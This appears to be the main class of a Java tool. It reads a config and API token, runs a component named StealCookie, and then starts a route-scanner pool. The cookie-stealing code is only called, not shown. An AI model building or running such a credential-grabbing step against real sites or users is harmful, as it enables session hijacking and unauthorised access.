/*
 *  Kahya - Gitas 2019
 *
 *  Contributors:
 *      Ahmet Ziya Kanbur 2019-
 *
 * */
package client;

import fleet.StealCookie;
import org.json.JSONObject;
import pool.RouteScannerPool;
import utils.APIRequest;
import utils.Common;

import java.io.File;

public class PoolMain {

    public static void main(String[] args){

        JSONObject config = new JSONObject(Common.readJSONFile(new File(args[0])));
        APIRequest.API_TOKEN = config.getString("api_token");

        StealCookie stealCookie = new StealCookie(); // @todo trigger li olacak bu
        stealCookie.action();
        RouteScannerPool routeScannerPool = new RouteScannerPool(config);
        routeScannerPool.start();

    }

}
